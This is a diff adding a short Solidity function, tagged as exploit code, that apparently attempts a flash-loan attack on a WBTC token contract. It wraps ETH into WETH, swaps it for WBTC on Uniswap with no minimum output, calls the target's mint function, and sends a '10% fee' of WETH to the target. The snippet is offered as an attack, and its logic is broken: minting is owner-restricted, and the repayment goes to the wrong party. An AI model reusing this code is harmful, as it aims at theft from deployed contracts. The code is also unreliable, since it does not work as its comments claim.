@@ -1,0 +1,33 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start by wrapping the flashloan amount into WETH
+    IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).deposit{value: amount}();
+
+    // Now we will perform a swap from WETH to WBTC
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken); // WETH
+    path[1] = token; // WBTC
+
+    // Execute swap
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        amount,
+        0, // Minimum amount of tokens to receive
+        path,
+        address(this),
+        block.timestamp + 3600 // Deadline
+    );
+
+    // Retrieve WBTC and perform necessary operations
+    uint256 wbtcAmount = IERC20(token).balanceOf(address(this));
+    IERC20(token).approve(target, wbtcAmount);
+    
+    // Call mint function in WBTC contract with the swapped WBTC amount
+    WBTC(target).mint(address(this), wbtcAmount);
+    
+    // Now we can withdraw the WETH back
+    uint256 requiredWETH = amount + (amount * 10 / 100); // Adding 10% fee to repay
+    IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).transfer(target, requiredWETH);
+}
+</executeExploitCode>
+```
